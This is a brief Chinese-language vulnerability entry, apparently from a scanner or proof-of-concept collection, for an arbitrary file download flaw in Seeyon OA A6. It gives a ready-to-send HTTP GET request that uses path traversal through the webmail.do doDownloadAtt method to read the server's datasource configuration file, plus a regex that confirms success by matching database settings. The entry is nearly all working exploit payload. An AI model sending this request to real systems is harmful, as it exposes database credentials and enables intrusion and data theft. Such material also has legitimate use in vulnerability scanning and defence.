# 致远OAA6v5任意文件下载漏洞

致远OA ｜ 其他 ｜ —
- **请求**：`GET /seeyon/webmail.do?method=doDownloadAtt&filename=indexx.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1`
- **响应特征**：-1 ^(?=.*?(?:ctpDataSource.minCount|mysql.path)).*?$